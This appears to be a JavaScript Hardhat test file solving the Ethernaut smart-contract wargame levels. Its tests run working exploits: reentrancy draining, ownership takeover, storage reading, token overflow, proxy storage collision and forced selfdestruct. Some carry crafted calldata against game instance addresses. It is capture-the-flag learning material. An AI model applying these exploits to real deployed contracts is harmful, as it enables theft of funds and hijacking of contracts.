const { expect } = require("chai");
const { ethers, waffle, network } = require("hardhat");

describe("Ethernaut ", function () {
  before(async () => {
    [account1, account2] = await ethers.getSigners();
  });

  it.skip("1.Fallback", async function () {
    const Contract = await ethers.getContractFactory("Fallback");
    const contract = await Contract.deploy();
    await contract.deployed();

    const provider = waffle.provider;

    //call contribute function
    await contract.connect(account2).contribute({ value: "100000000000000" });

    //check that the contract has balance
    console.log(
      "Balance of the contract before attack:",
      (await provider.getBalance(contract.address)).toString()
    );
    //create a tx to send ether to the contract
    tx = {
      to: contract.address,
      value: "100000000000000",
    };

    //send ether to the contract and steal ownership
    await account2.sendTransaction({
      to: contract.address,
      value: "100000000000000",
    });

    //check ownership
    expect(await contract.owner()).to.be.equal(account2.address);

    //withdraw the funds
    await contract.connect(account2).withdraw();

    //check that the contract has no balance
    console.log(
      "Balance of the contract after attack:",
      (await provider.getBalance(contract.address)).toString()
    );
  });

  it.skip("2.Fallout", async function () {
    const Contract = await ethers.getContractFactory("Fallout");
    const contract = await Contract.deploy();
    await contract.deployed();

    const provider = waffle.provider;

    //check owner (the contract shuldnt have owner)
    expect(await contract.owner()).to.be.equal(
      "0x0000000000000000000000000000000000000000"
    );

    //steal ownership
    await contract.connect(account2).Fal1out();

    //check if the ownership changes
    expect(await contract.owner()).to.be.equal(account2.address);
  });

  it.skip("3.Coin Flip", async function () {
    const Contract = await ethers.getContractFactory("CoinFlip");
    const contract = await Contract.deploy();
    await contract.deployed();

    const Attacker = await ethers.getContractFactory("CoinFlipAttacker");
    const attacker = await Attacker.deploy(contract.address);
    await attacker.deployed();

    const provider = waffle.provider;

    for (let i = 0; i < 10; i++) {
      await attacker.attack();
    }

    console.log("aciertos: ", (await contract.consecutiveWins()).toString());
  });

  it.skip("4.Telephone", async function () {
    const Contract = await ethers.getContractFactory("Telephone");
    const contract = await Contract.deploy();
    await contract.deployed();

    const Attacker = await ethers.getContractFactory("TelephoneAttacker");
    const attacker = await Attacker.deploy(contract.address);
    await attacker.deployed();

    const provider = waffle.provider;

    console.log("Owner before the attack: ", await contract.owner());
    await attacker.attack();
    console.log("Owner after the attack: ", await contract.owner());
  });

  it.skip("5.Token", async function () {
    const Contract = await ethers.getContractFactory("Token");
    const contract = await Contract.deploy(20);
    await contract.deployed();

    //check the correct deploy
    expect(await contract.balanceOf(account1.address)).to.be.equal(20);

    //execute the attack, balance should be greater than 20
    await contract.transfer(account2.address, 21);

    //check if the attack works
    console.log(
      "Balance of account1: ",
      (await contract.balanceOf(account1.address)).toString()
    );
  });

  //had some wierd problems using ethers js here
  it.skip("6.Delegation", async function () {
    const Delegate = await ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(account2.address);
    await delegate.deployed();

    const Delegation = await ethers.getContractFactory("Delegation");
    const delegation = await Delegation.connect(account2).deploy(
      delegate.address
    );
    await delegation.deployed();

    expect(await delegation.owner()).to.be.equal(account2.address);
    const selector = web3.eth.abi.encodeFunctionSignature("pwn()");
    await web3.eth.sendTransaction({
      from: account1.address,
      to: delegation.address,
      data: selector,
    });

    expect(await delegation.owner()).to.be.equal(account1.address);
  });

  it.skip("7.Force", async function () {
    const Force = await ethers.getContractFactory("Force");
    const force = await Force.deploy();
    await force.deployed();

    //contract with ether and selfdestruct instruction
    const Helper = await ethers.getContractFactory("Helper");
    const helper = await Helper.deploy(force.address, { value: "10000000000" });
    await helper.deployed();

    const provider = waffle.provider;

    //call the function to destruct and send the ether
    await helper.destroy();

    console.log(
      "Balance of Force contract: ",
      (await provider.getBalance(force.address)).toString()
    );
  });

  it.skip("9.King", async function () {
    const King = await ethers.getContractFactory("King");
    const king = await King.deploy({ value: "100" });
    await king.deployed();

    //contract that will send ether to the king contract and cannot receive ether
    const KingAttacker = await ethers.getContractFactory("KingAttacker");
    const kingAttacker = await KingAttacker.connect(account2).deploy();
    await kingAttacker.deployed();

    //send ether to claim the king
    await kingAttacker.attack(king.address, { value: "1000" });

    //check that king change
    expect(await king._king()).to.be.equal(kingAttacker.address);

    //contract cannot receive ether
    await expect(
      account1.sendTransaction({ to: king.address, value: "10000000" })
    ).to.be.reverted;
  });

  it.skip("10.Reentrance", async function () {
    const Reentrance = await ethers.getContractFactory("Reentrance");
    const reentrance = await Reentrance.deploy();
    await reentrance.deployed();

    //contract that will execute the reentrancy
    const ReentranceAttacker = await ethers.getContractFactory(
      "ReentranceAttacker"
    );
    const reentranceAttacker = await ReentranceAttacker.deploy(
      reentrance.address,
      { value: "100000000000000" }
    );
    await reentranceAttacker.deployed();
    const provider = waffle.provider;

    //deposit to the reentrace contract in behalf of the attacker contract
    await reentranceAttacker.deposit();
    await reentrance.donate(account1.address, { value: "10000000000000000" });

    //check the balance of the reentrance contract
    expect(await provider.getBalance(reentrance.address)).to.be.equal(
      "10100000000000000"
    );

    //check if ether deposited correctly
    expect(await reentrance.balanceOf(reentranceAttacker.address)).to.be.equal(
      "100000000000000"
    );

    //execute the withdraw and the reentrancy through the receive function
    await reentranceAttacker.attack();

    //check that all the fund were steal
    expect(await provider.getBalance(reentrance.address)).to.be.equal(0);
  });

  it.skip("11.Elevator", async function () {
    const Elevator = await ethers.getContractFactory("Elevator");
    const elevator = await Elevator.deploy();
    await elevator.deployed();

    //contract that will trick the elevator
    const Building = await ethers.getContractFactory("Edificio");
    const building = await Building.deploy(elevator.address);
    await building.deployed();

    //check the initial state
    expect(await elevator.top()).to.be.false;

    //execute the attack
    await building.goToElevator();

    //check that the attack was succesfull
    expect(await elevator.top()).to.be.true;
  });

  it.skip("12.Privacy", async function () {
    const Privacy = await ethers.getContractFactory("Privacy");

    //test with a local instance
    const hola = ethers.utils.formatBytes32String("Hola");
    const como = ethers.utils.formatBytes32String("como");
    const va = ethers.utils.formatBytes32String("va");
    const data = [hola, como, va];

    const privacy = await Privacy.deploy(data);
    await privacy.deployed();

    //const provider = waffle.provider;
    const slot3 = await web3.eth.getStorageAt(privacy.address, 3);

    let response = ethers.utils.parseBytes32String(slot3);
    console.log("Slot 3 of storage: ", response);

    //fork openzeppelin privacy instance to see the key
    const PrivacyInstance = await ethers.getContractAt(
      "Privacy",
      "0x0D7211d2E87927d6FC6bFDaC118fB30C280EBBCf"
    );
    const PrivacyAttacker = await ethers.getContractFactory("PrivacyAttacker");
    const privacyAttacker = await PrivacyAttacker.deploy();
    await privacyAttacker.deployed();

    //access to the storage slot where the key is
    let key32 = await web3.eth.getStorageAt(PrivacyInstance.address, 5);

    //this key is stored in the privacy attacker contract and parsed to bytes16 to be sended
    console.log("The key (bytes32) of ethernat 12) is: ", key32);

    await privacyAttacker.callUnlock(PrivacyInstance.address);

    expect(await PrivacyInstance.locked()).to.be.false;
  });

  it.skip("13.GatekeeperOne", async function () {
    //const GatekeeperOne = await ethers.getContractAt("GatekeeperOne","0x176D67A62b870794704fED64701EA7537ccADca0");

    const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne");
    const gatekeeperOne = await GatekeeperOne.deploy();
    await gatekeeperOne.deployed();

    const GatekeeperAttacker = await ethers.getContractFactory(
      "GatekeeperAttacker"
    );
    const gatekeeperAttacker = await GatekeeperAttacker.deploy();
    await gatekeeperAttacker.deployed();

    await gatekeeperAttacker.callEnter(
      "0x1c4bfc9f16029bcc",
      gatekeeperOne.address,
      { gasLimit: 30000 }
    );
  });

  it.skip("14.GatekeeperTwo", async function () {
    //const GatekeeperOne = await ethers.getContractAt("GatekeeperOne","0x176D67A62b870794704fED64701EA7537ccADca0");

    const GatekeeperTwo = await ethers.getContractFactory("GatekeeperTwo");
    const gatekeeperTwo = await GatekeeperTwo.deploy();
    await gatekeeperTwo.deployed();

    const GatekeeperEnter = await ethers.getContractFactory("GatekeeperEnter");
    const gatekeeperEnter = await GatekeeperEnter.deploy(gatekeeperTwo.address);
    await gatekeeperEnter.deployed();

    expect(await gatekeeperTwo.entrant()).to.be.equal(account1.address);
  });

  it.skip("15.NaughtCoin", async function () {
    const NaughtCoin = await ethers.getContractFactory("NaughtCoin");
    const naughtCoin = await NaughtCoin.deploy(account1.address);
    await naughtCoin.deployed();

    const NaughtCoinAux = await ethers.getContractFactory("NaughtCoinAux");
    const naughtCoinAux = await NaughtCoinAux.deploy();
    await naughtCoinAux.deployed();

    await naughtCoin.increaseAllowance(
      naughtCoinAux.address,
      "1000000000000000000000000"
    );

    expect(
      await naughtCoin.allowance(account1.address, naughtCoinAux.address)
    ).to.be.equal("1000000000000000000000000");
    await naughtCoinAux.transferTokens(naughtCoin.address);
  });

  it.skip("16.Preservation", async function () {
    const Preservation = await ethers.getContractAt(
      "Preservation",
      "0xC47e88424fc6994B6b3B35d4595065447F521b84"
    );

    const PreservationAttacker = await ethers.getContractFactory(
      "PreservationAttacker"
    );
    const preservationAttacker = await PreservationAttacker.deploy(
      Preservation.address
    );
    await preservationAttacker.deployed();

    //Change the library address for a malicius address
    await preservationAttacker.setAddress1();

    //Modify the storage trhough the delegatecall
    await preservationAttacker.attack();

    console.log(await Preservation.owner());
  });

  it.skip("17.Recovery", async function () {
    const SimpleToken = await ethers.getContractFactory("SimpleToken");
    const simpleToken = await SimpleToken.deploy(
      "Token",
      account1.address,
      1000000
    );
    await simpleToken.deployed();

    await account1.sendTransaction({ to: simpleToken.address, value: 1000000 });

    expect(await ethers.provider.getBalance(simpleToken.address)).to.be.equal(
      1000000
    );

    //execute the selfdestruct opcode
    await simpleToken.destroy(account1.address);
  });

  it.skip("19.AlienCodex", async function () {
    const AlienCodex = await ethers.getContractFactory("AlienCodex");
    const alienCodex = await AlienCodex.deploy();
    await alienCodex.deployed();

    const ComputeSlot = await ethers.getContractFactory("ComputeSlot");
    const computeSlot = await ComputeSlot.deploy();
    await computeSlot.deployed();

    await alienCodex.make_contact();
    await alienCodex.retract();

    let address =
      "0x000000000000000000000000Ec948CC31227f0359717c69489cEe7BE7aEFbFD1";

    console.log(await computeSlot.slot());
    await alienCodex.revise(
      "35707666377435648211887908874984608119992236509074197713628505308453184860938",
      "0x000000000000000000000000Ec948CC31227f0359717c69489cEe7BE7aEFbFD1"
    );

    console.log(await alienCodex.owner());
  });

  it.skip("20.Denial", async function () {
    const Denial = await ethers.getContractFactory("Denial");
    const denial = await Denial.deploy();
    await denial.deployed();

    const DenialAttacker = await ethers.getContractFactory("DenialAttacker");
    const denialAttacker = await DenialAttacker.deploy(denial.address);
    await denialAttacker.deployed();

    await account1.sendTransaction({
      to: denial.address,
      value: "1000000000000000000",
    });

    await denial.setWithdrawPartner(denialAttacker.address);

    await denial.withdraw();

    console.log(
      (await ethers.provider.getBalance(denialAttacker.address)).toString()
    );
  });

  it.skip("21.Shop", async function () {
    const Shop = await ethers.getContractFactory("Shop");
    const shop = await Shop.deploy();
    await shop.deployed();

    const BuyerContract = await ethers.getContractFactory("BuyerContract");
    const buyerContract = await BuyerContract.deploy();
    await buyerContract.deployed();

    await buyerContract.callBuy(shop.address);
  });

  it.skip("22.Dex", async function () {
    const Dex = await ethers.getContractAt(
      "Dex",
      "0x39660746a19B7C02ebb2f2Cb842446b608751e61"
    );

    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1"],
    });

    let myAddress = ethers.provider.getSigner(
      "0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1"
    );

    let token1 = await Dex.token1();
    let token2 = await Dex.token2();

    await Dex.connect(myAddress).approve(Dex.address, 1000);

    /**
      Balance del address del token1:  0
      Balance del address del token2:  20
      Balance del contrato del token1:  110
      Balance del contrato del token2:  90
     */
    await Dex.connect(myAddress).swap(
      token1,
      token2,
      await Dex.balanceOf(token1, myAddress._address)
    );

    /**
     Balance del address del token1:  24
      Balance del address del token2:  0
      Balance del contrato del token1:  86
      Balance del contrato del token2:  110
     */
    await Dex.connect(myAddress).swap(
      token2,
      token1,
      await Dex.balanceOf(token2, myAddress._address)
    );

    /**
     * Balance del address del token1:  0
Balance del address del token2:  30
Balance del contrato del token1:  110
Balance del contrato del token2:  80
     */
    await Dex.connect(myAddress).swap(
      token1,
      token2,
      await Dex.balanceOf(token1, myAddress._address)
    );

    /**
     * Balance del address del token1:  41
Balance del address del token2:  0
Balance del contrato del token1:  69
Balance del contrato del token2:  110
     */
    await Dex.connect(myAddress).swap(
      token2,
      token1,
      await Dex.balanceOf(token2, myAddress._address)
    );

    /**
     * Balance del address del token1:  0
Balance del address del token2:  65
Balance del contrato del token1:  110
Balance del contrato del token2:  45
     */
    await Dex.connect(myAddress).swap(
      token1,
      token2,
      await Dex.balanceOf(token1, myAddress._address)
    );

    /**
     * Balance del address del token1:  110
Balance del address del token2:  20
Balance del contrato del token1:  0
Balance del contrato del token2:  90
     */
    await Dex.connect(myAddress).swap(token2, token1, 45);

    console.log(
      "Balance del address del token1: ",
      (await Dex.balanceOf(token1, myAddress._address)).toString()
    );
    console.log(
      "Balance del address del token2: ",
      (await Dex.balanceOf(token2, myAddress._address)).toString()
    );
    console.log(
      "Balance del contrato del token1: ",
      (await Dex.balanceOf(token1, Dex.address)).toString()
    );
    console.log(
      "Balance del contrato del token2: ",
      (await Dex.balanceOf(token2, Dex.address)).toString()
    );
  });

  it.skip("23.DexTwo", async function () {
    const Dex = await ethers.getContractAt(
      "DexTwo",
      "0x3CC80992FEA17A14106279b1Ab0399132D059589"
    );

    const Token = await ethers.getContractAt(
      "TokenDex",
      "0xEA697D96F04fE2a9E68554230929b0Dd6F60380c"
    );

    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1"],
    });

    let myAddress = ethers.provider.getSigner(
      "0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1"
    );

    await Dex.connect(myAddress).approve(Dex.address, 1000);
    await Token.connect(myAddress).approve(Dex.address, 1000);

    let token1 = await Dex.token1();
    let token2 = await Dex.token2();

    await Dex.connect(myAddress).swap(Token.address, token1, 100);
    await Dex.connect(myAddress).swap(Token.address, token2, 200);

    console.log(
      "Balance del contrato del token1: ",
      (await Dex.balanceOf(token1, Dex.address)).toString()
    );
    console.log(
      "Balance del contrato del token2: ",
      (await Dex.balanceOf(token2, Dex.address)).toString()
    );
  });

  it.skip("24.PuzzleWallet", async function () {
    // Instanciate the proxy functions and the implementation functions
    const Proxy = await ethers.getContractAt(
      "PuzzleProxy",
      "0x69d977aDb501bd71d02168869E51C1676297B8f1"
    );

    const ImplementacionProxy = await ethers.getContractAt(
      "PuzzleWallet",
      "0x69d977aDb501bd71d02168869E51C1676297B8f1"
    );

    // claim the ownership of the implementation
    await Proxy.proposeNewAdmin(account1.address);

    // add to whitelist
    await ImplementacionProxy.addToWhitelist(account1.address);
    expect(await ImplementacionProxy.whitelisted(account1.address)).to.be.true;

    // [deposit(), multicall => deposit(), execute()]
    let data0 = "0xd0e30db0"; //0xd0e30db0
    let data1 =
      "0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000";
    let data2 =
      "0xb61d27f6000000000000000000000000ec948cc31227f0359717c69489cee7be7aefbfd100000000000000000000000000000000000000000000000000071afd498d000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000";
    let data = [data0, data1, data2];
    await ImplementacionProxy.multicall(data, { value: "1000000000000000" });

    // check that the balance of the contract is 0
    expect(
      await ethers.provider.getBalance(ImplementacionProxy.address)
    ).to.be.equal(0);

    // set the slot 1 of storage to my address
    await ImplementacionProxy.setMaxBalance(
      "1350634594303034131487269957360833128236638519249"
    );

    // check that the admin was stoled
    expect(await Proxy.admin()).to.be.equal(
      "0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1"
    );
  });

  it.skip("25.Motorbike", async function () {
    // Instanciate the proxy functions and the implementation functions
    const Motorbike = await ethers.getContractAt(
      "Motorbike",
      "0x90f52AF04C8ff37eBDd1d5732c7e996659De9ac4"
    );

    const Engine = await ethers.getContractAt(
      "Engine",
      "0x90f52AF04C8ff37eBDd1d5732c7e996659De9ac4"
    );

    const Implementation = await ethers.getContractAt(
      "Engine",
      "0xEa069AAdF2e9ff1893f29157380d90F9335E17f8"
    );

    const MotorbikeAttacker = await ethers.getContractFactory(
      "MotorbikeAttacker"
    );
    const motorbikeAttacker = await MotorbikeAttacker.deploy();
    await motorbikeAttacker.deployed();

    //Initialize the unprotected implementation to gain the upgrader role
    await Implementation.initialize();

    // data destroy() = 0x83197ef0, upgrade the contract to a malicious one and call the selfdestruct opcode
    await Implementation.upgradeToAndCall(
      motorbikeAttacker.address,
      "0x83197ef0"
    );

    // check that there is no more logic contract to be called
    await expect(Engine.upgrader()).to.be.reverted;
  });

  it("26.DoubleEntryPoint", async function () {
    // Instanciate the proxy functions and the implementation functions
    const DoubleEntryPointToken = await ethers.getContractAt(
      "DoubleEntryPoint",
      "0x2CFF389DA511bB2A0f0EE881Eb5BAE092A374eF4"
    );

    const LegacyToken = await ethers.getContractAt(
      "DoubleEntryPoint",
      "0x9ca0651cC35CbfB99227533C55ad573f0Ec92253"
    );

    const CryptoVault = await ethers.getContractAt(
      "CryptoVault",
      "0xcaD9deF597a1dD250655954e127C3C600044Af97"
    );

    let tx = await CryptoVault.sweepToken(LegacyToken.address);
    console.log(tx);
  });
});
